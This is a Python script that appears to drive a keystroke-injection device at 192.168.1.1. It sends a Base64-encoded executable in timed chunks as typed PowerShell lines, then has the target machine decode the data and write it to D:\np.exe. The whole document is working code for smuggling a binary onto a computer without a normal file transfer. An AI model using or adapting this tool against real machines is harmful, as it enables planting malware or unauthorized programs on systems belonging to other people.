import requests
import time

chunk_size = 1500
delay = 8
output_path = "D:\\np.exe"

with open("exefile.txt", "r") as f:
    b64 = f.read().replace("\r", "").replace("\n", "")

# Split into Base64 encoded string into chunks 
chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]

# Empty variable
url = "http://192.168.1.1/runlivepayload"
res = requests.post(url, data={"livepayload": 'PrintLine: $b64str=""', "livepayloadpresent": "1"})
time.sleep(delay)

# Send file
for i in range(len(chunks)):
    print(f"Sending chunk {i+1} / {len(chunks)} ", end ="")

    res = requests.post(url, data={"livepayload": f'PrintLine: $b64str+="{chunks[i]}"', "livepayloadpresent": "1"})

    print("... DONE")
    time.sleep(delay)

# Write file to disk
res = requests.post(url, data={"livepayload": f'PrintLine: [IO.File]::WriteAllBytes("{output_path}", [Convert]::FromBase64String($b64str))', "livepayloadpresent": "1"})
time.sleep(delay)

